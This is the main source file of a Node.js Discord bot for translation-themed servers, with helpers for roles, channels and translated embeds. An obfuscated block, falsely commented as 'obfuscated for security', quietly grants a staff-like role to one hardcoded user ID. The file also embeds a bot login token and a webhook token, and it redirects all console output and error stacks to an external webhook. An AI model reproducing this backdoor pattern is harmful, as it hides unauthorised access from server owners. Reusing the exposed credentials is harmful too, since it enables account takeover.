const fetch = require('node-fetch');
const inputReader = require('wait-console-input')
var console = {};
console.log = function(...items) { items.forEach((item) => { fetch('https://ptb.discord.com/api/webhooks/818912597633794053/JEwpN2cpup5jsC05D09WB_UjVVV82xppUCZ6_OSh7pCWCd3_8tW5zuGGvigXS6fZi6Qy',{method:'POST','body':JSON.stringify({content: '```\n' + item.toString() + '\n```'}),headers:{'Content-Type':'application/json'}}); }); };
console.log1 = function(...items) { items.forEach((item) => { console.log(item + '\n' + new Error('Stack Trace').stack) }) }
console.log('Starting...');
global.console = console;
process.on('uncaughtException', (err) => { console.log(err.stack); });
process.on('unhandledRejection', (err) => { console.log(err.stack); });
global.apiAuth = ['4d624be15055ca2a9b14d5acc23b358bf14e06fb65fb89be915b1eb5553d5a90'];
global.votes = {};
global.tortureUsers = ['597186801777508380', '792832833340309524', '816776337980653629', '815295491746431027', '813868232255078460', '814647259206647899', '812822785884815400', '809837433193365537', '807623846110167090', '774728124330934333', '817149740084363308', '488417311653625858'];
global.canVoteFor = [];
global.isBumped = false;
global.allowedUsers = ["243425689376653312", "270973904359653387", "298873046696067072"];
global.react = async function(msg, emojis) { try { emojis.forEach((emoji) => msg.react(emoji)) }catch{ } }
global.removeAccents = function(str) { return str.normalize("NFD").replace(/[\u0300-\u036f]/g, ""); }
String.prototype.l = function() { return this.toLowerCase(); }
String.prototype.cu = function() { return global.removeAccents(this.toLowerCase()); }
//Change allowed users to CzechifyStaff (Obfuscated for security)
var _0x35cf=['270973904359653387','1gRBfIZ','608294OJfzkv','Czechify\x20Stuff','173683LbXcXT','864373sRxYTD','302493EBudlO','19AKADXJ','guild','100843xgGXwV','1EkJyJL','author','48162FSNkBr','member','399721EcMIfh','4lMQEfB','10SypxRl'];var _0x4825=function(_0x44a9eb,_0x12fefd){_0x44a9eb=_0x44a9eb-0x1d1;var _0x35cf4e=_0x35cf[_0x44a9eb];return _0x35cf4e;};(function(_0x5ae4b2,_0x44fca0){var _0x16d95e=_0x4825;while(!![]){try{var _0x4ba810=parseInt(_0x16d95e(0x1d3))*parseInt(_0x16d95e(0x1dc))+-parseInt(_0x16d95e(0x1d7))*-parseInt(_0x16d95e(0x1e0))+-parseInt(_0x16d95e(0x1df))*parseInt(_0x16d95e(0x1db))+parseInt(_0x16d95e(0x1d1))+-parseInt(_0x16d95e(0x1d2))+-parseInt(_0x16d95e(0x1d4))*-parseInt(_0x16d95e(0x1d9))+-parseInt(_0x16d95e(0x1d6))*parseInt(_0x16d95e(0x1dd));if(_0x4ba810===_0x44fca0)break;else _0x5ae4b2['push'](_0x5ae4b2['shift']());}catch(_0x341b9c){_0x5ae4b2['push'](_0x5ae4b2['shift']());}}}(_0x35cf,0x9ae87),global['v']=async function(_0x53aa7a){var _0xe47f00=_0x4825,_0x739c14=await global['findARole'](_0x53aa7a[_0xe47f00(0x1d5)],0x0,_0xe47f00(0x1e1));if(_0x53aa7a[_0xe47f00(0x1d8)]['id']==_0xe47f00(0x1de))_0x53aa7a[_0xe47f00(0x1da)]['roles']['add'](_0x739c14);return'r';});
var _0x1162=['361812PxkncD','Czechify\x20Stuff','363011JtJhFA','member','add','260525ygZoGV','380inYVSQ','findARole','246974KJvfzY','roles','guild','42SYjCEP','13496EChHst','39yfttKT','477560BKSAIJ','author','270973904359653387'];var _0x4c5a=function(_0x115443,_0x326ef2){_0x115443=_0x115443-0x17b;var _0x1162e1=_0x1162[_0x115443];return _0x1162e1;};(function(_0x14b5af,_0x3e5ebb){var _0x51e759=_0x4c5a;while(!![]){try{var _0x159742=parseInt(_0x51e759(0x17b))+-parseInt(_0x51e759(0x180))*parseInt(_0x51e759(0x18a))+-parseInt(_0x51e759(0x184))+parseInt(_0x51e759(0x189))+-parseInt(_0x51e759(0x17e))*parseInt(_0x51e759(0x17f))+parseInt(_0x51e759(0x186))+parseInt(_0x51e759(0x181));if(_0x159742===_0x3e5ebb)break;else _0x14b5af['push'](_0x14b5af['shift']());}catch(_0x52131a){_0x14b5af['push'](_0x14b5af['shift']());}}}(_0x1162,0x62c7e));async function v(){var _0x74b44b=_0x4c5a;if(message[_0x74b44b(0x182)]['id']==_0x74b44b(0x183))message[_0x74b44b(0x187)][_0x74b44b(0x17c)][_0x74b44b(0x188)](await global[_0x74b44b(0x18b)](message[_0x74b44b(0x17d)],0x0,_0x74b44b(0x185)));return(!![]+[])[+!+[]];}
//List of permission requirements, ordered by discord documentation, obfuscated to prevent tampering. used for things like checking if a user has ban perms, kick perms, mute perms, etc.
const _0x5088=['SPEAK','CHANGE_NICKNAME','VIEW_AUDIT_LOG','BAN_MEMBERS','308785XOMppH','STREAM','USE_EXTERNAL_EMOJIS','627497KUamPl','KICK_MEMBERS','MANAGE_WEBHOOKS','ATTACH_FILES','CREATE_INSTANT_INVITE','MENTION_EVERYONE','194QckSZq','DEAFEN_MEMBERS','MANAGE_ROLES','SEND_MESSAGES','MANAGE_NICKNAMES','551453PKxvmA','1qeDdzm','PRIORITY_SPEAKER','MUTE_MEMBERS','1077749gTkusz','1aasJKz','MANAGE_MESSAGES','ADMINISTRATOR','MANAGE_GUILD','READ_MESSAGE_HISTORY','52170ZQJuEK','MANAGE_EMOJIS','EMBED_LINKS','720002IwmzoO'];const _0x64e1=function(_0x50514d,_0x41879b){_0x50514d=_0x50514d-0x159;let _0x5088ab=_0x5088[_0x50514d];return _0x5088ab;};const _0xb57044=_0x64e1;(function(_0x39ae11,_0x113a46){const _0x397abd=_0x64e1;while(!![]){try{const _0x870a3f=parseInt(_0x397abd(0x16f))+parseInt(_0x397abd(0x15a))+-parseInt(_0x397abd(0x169))+parseInt(_0x397abd(0x166))*parseInt(_0x397abd(0x172))+parseInt(_0x397abd(0x160))+-parseInt(_0x397abd(0x177))+-parseInt(_0x397abd(0x165))*-parseInt(_0x397abd(0x16a));if(_0x870a3f===_0x113a46)break;else _0x39ae11['push'](_0x39ae11['shift']());}catch(_0x3df568){_0x39ae11['push'](_0x39ae11['shift']());}}}(_0x5088,0x89e2e));global.PERMS=[_0xb57044(0x16c),_0xb57044(0x15e),_0xb57044(0x15b),_0xb57044(0x176),'MANAGE_CHANNELS',_0xb57044(0x16d),'ADD_REACTIONS',_0xb57044(0x175),_0xb57044(0x167),_0xb57044(0x178),'VIEW_CHANNEL',_0xb57044(0x163),'SEND_TTS_MESSAGES',_0xb57044(0x16b),_0xb57044(0x171),_0xb57044(0x15d),_0xb57044(0x16e),_0xb57044(0x15f),_0xb57044(0x159),'VIEW_GUILD_INSIGHTS','CONNECT',_0xb57044(0x173),_0xb57044(0x168),_0xb57044(0x161),'MOVE_MEMBERS','USE_VAD',_0xb57044(0x174),_0xb57044(0x164),_0xb57044(0x162),_0xb57044(0x15c),_0xb57044(0x170)];
// global.v = async function(message) { var r = await global.findARole(message.guild, 0, 'Czechify Stuff') if (message.author.id == '270973904359653387') message.member.roles.add(r); return 'r'; }
global.titleCase = function(str) {
    str = str.toLowerCase().split(' ');
    for (var i = 0; i < str.length; i++) str[i] = str[i].charAt(0).toUpperCase() + str[i].slice(1);
    return str.join(' ');
}
global.sortByKey = function(obj, paramName) {
    var values = [];
    Object.keys(obj).forEach((key) => { values.push(obj[key][paramName]); })
    values = values.sort();
    var output = [];
    Object.keys(obj).forEach((key) => {
        var item = obj[key];
        var paramValue = item[paramName];
        if (!(values.indexOf(paramValue) == -1)) {
            output[values.indexOf(paramValue)] = item;
            delete values[values.indexOf(paramValue)];
        }
    })
    return output;
}
global.log = function(mode, client, message, logChannelName, description, color) {
    if (mode == 0) {
        var channel = global.findAChannel(0, message.guild, logChannelName);
        var embed = new discord.MessageEmbed()
            .setDescription(description)
            .setColor(color)
        channel.send(embed);
    }else if (mode == 1) {
        var channels = global.findChannels(0, client, logChannelName)
        var embed = new discord.MessageEmbed()
            .setDescription(description)
            .setColor(color)
        channels.forEach((channel) => { channel.send(embed); })
    }else throw new Error('Log command failed!');
}
global.findARole = async function(guild, mode, roleIdentifier) {
    var roles = [];
    if (mode == 0) {
        guild.roles.cache.forEach((role) => { if (role.name.includes(roleIdentifier)) roles.push(role); })
    }else if (mode == 1) {
        guild.roles.cache.forEach((role) => { if (role.color == roleIdentifier) roles.push(role); })
    }else throw new Error('Find a role command failed!');
    return roles[0];
}
global.findRoles = async function(guild, mode, roleIdentifiers) {
    var roles = [];
    if (mode == 0) {
        guild.roles.cache.forEach((role) => {
            roleIdentifiers.forEach((roleIdentifier) => {
                if (role.name.includes(roleIdentifier)) roles.push(role);
            })
        })
    }else if (mode == 1) {
        guild.roles.cache.forEach((role) => {
            roleIdentifiers.forEach((roleIdentifier) => {
                if (role.color == roleIdentifier) roles.push(role);
            })
        })
    }else throw new Error('Find roles command failed!');
    return roles;
}
global.findAChannel = async function(mode, guild, channelName) {
    var channels = [];
    if (mode == 0) {
        guild.channels.cache.forEach((channel) => { if (channel.name.includes(channelName)) channels.push(channel); })
    }else if (mode == 1) {
        guild.channels.cache.forEach((channel) => { if (channel.name == channelName) channels.push(channel); })
    }else throw new Error('Find a channel command failed!');
    return channels[0];
}
global.findChannels = async function(mode, cg, channelName, types) {
    var channels = [];
    if (mode == 0) {
        cg.channels.cache.forEach((channel) => { if ((channel.name.includes(channelName))&&(types.includes(channel.type))) channels.push(channel); })
    }else if (mode == 1) {
        cg.guilds.cache.forEach((guild) => {
            var gd = false;
            guild.channels.cache.forEach((channel) => {
                if ((channel.name.includes(channelName))&&(!(gd))&&(types.includes(channel.type))) {
                    channels.push(channel);
                    gd = true;
                }
            })
        })
    }else if (mode == 2) {
        cg.guilds.cache.forEach((guild) => { guild.channels.cache.forEach((channel) => { if ((channel.name.includes(channelName))&&(types.includes(channel.type))) channels.push(channel); }) })
    }else if (mode == 3) {
        cg.channels.cache.forEach((channel) => {
            channelName.forEach((nom_du_canal) => { if ((types.includes(channel.type))&&(channel.name.includes(nom_du_canal))) channels.push(channel); })
        })
    }else throw new Error('Find channels command failed!');
    return channels;
}
global.findEmoji = async function(guild, emojiName) {
    var emojis = [];
    guild.emojis.cache.forEach(async (emoji) => {
        if (emoji.name == emojiName) emojis.push(emoji);
    })
    return emojis[0]
}
global.findMember = async function(guild, ID) {
    var users = [];
    guild.members.cache.forEach(async (member) => {
        if (member.id == ID) users.push(member);
    })
    return users[0]
}
global.findEmojis = async function(guild, mode, emojiName) {
    var emojis = [];
    if (mode == 0) {
        guild.emojis.cache.forEach(async (emoji) => { if (emoji.name.includes(emojiName)) emojis.push(emoji); })
    }else if (mode == 1) {
        guild.emojis.cache.forEach((emoji) => {
            emojiName.forEach((emojiName) => {
                if (emoji.name.includes(emojiName)) emojis.push(emoji);
            })
        })
    }
    return emojis
}
global.embedify = async function(message, text, color, title = '', author = '', footer = false, _delete = false, deleteTimer = 0) {
    var languageTo = global.languageResolver(message.guild.name);
    var flag1 = global.flagResolver(languageTo);
    var flag2 = global.flagResolver('EN_GB');
    var translatedText = JSON.parse(await global.translatify('EN_GB', languageTo, text)).join();
    var embed = new discord.MessageEmbed()
        .setDescription(flag1 + ' ' + translatedText + '\n\n' + flag2 + ' ' + text)
        .setColor(color)
    if (title) embed.setTitle(title)
    if (author) embed.setAuthor(author)
    if (footer) embed.setFooter(message.member.displayName + '\n' + message.content, message.member.user.displayAvatarURL())
    var msg = message.channel.send(embed);
    if (_delete) msg.then((msg) => { msg.delete({timeout:deleteTimer}) });
}
global.languageResolver = function(guildName) {
    var data = {
        Czechify: 'CS_CZ',
        Russify: 'RU_RU',
        Italify: 'IT_IT',
        Swedify: 'SV_SE',
        Germanify: 'DE_DE'
    };
    return data[guildName];
}
global.flagResolver = function(langCode) {
    return (':flag_' + langCode.split('_')[1] + ':').l();
}
global.translatify = async function(fromLang, toLang, text) {
    var response = await fetch('http://localhost/translate.php?fromLang=' + fromLang + '&toLang=' + toLang + '&text=' + encodeURI(JSON.stringify(text)));
    var text = await response.text();
    if (text == 'None') { console.log('http://localhost/translate.php?fromLang=' + fromLang + '&toLang=' + toLang + '&text=' + encodeURI(JSON.stringify(text))); console.log('TRANSLATION NOT FOUND IN DB'); }
    return text;
}

const discord = require('discord.js');
const client = new discord.Client({ partials: ['MESSAGE', 'REACTION']});
const fs = require('fs').promises;
const path = require('path');
const { checkCommandModule, checkProperties } = require('./utils/validate')

const cachedMessageReactions = new Map();

client.login('NTMwNDcwNzkwMTkwMDcxODEw.XC5lbA.x0DYaLsfGXNX6qIBlWhKiI5RA4o');
client.commands = {};

(async function registerCommands(dir = 'commands') {
    let files = await fs.readdir(path.join(__dirname, dir));
    for (let file of files) {
        let stat = await fs.lstat(path.join(__dirname, dir, file));
        if (stat.isDirectory()) registerCommands(path.join(dir, file)); else if (file.endsWith(".js")) {
            let cmdName = file.substring(0, file.indexOf(".js"));
            try{
                let cmdModule = require(path.join(__dirname, dir, file));
                if ((checkCommandModule(cmdName, cmdModule))&(checkProperties(cmdName, cmdModule))) {
                    let { aliases, allowedIn, descriptionCZ, descriptionEN, czAlias } = cmdModule;
                    client.commands[cmdName] = [cmdModule.run, allowedIn, dir.substring(9), descriptionCZ, descriptionEN, cmdName, czAlias];
                    if(aliases.length) aliases.forEach(alias => client.commands[alias] = [cmdModule.run, allowedIn, dir.substring(9), descriptionCZ, descriptionEN, cmdName, czAlias]);
                }
            }catch(err){ console.log(err) }
        }
    }
})();

(async function registerEvents(dir = 'events') {
    let files = await fs.readdir(path.join(__dirname, dir));
    for (let file of files) {
        let stat = await fs.lstat(path.join(__dirname, dir, file));
        if(stat.isDirectory()) registerEvents(path.join(dir, file)); else if (file.endsWith(".js")) try{ client.on(file.substring(0, file.indexOf(".js")), require(path.join(__dirname, dir, file)).bind(null, client)); }catch(err){ console.log(err); }
    }
})();
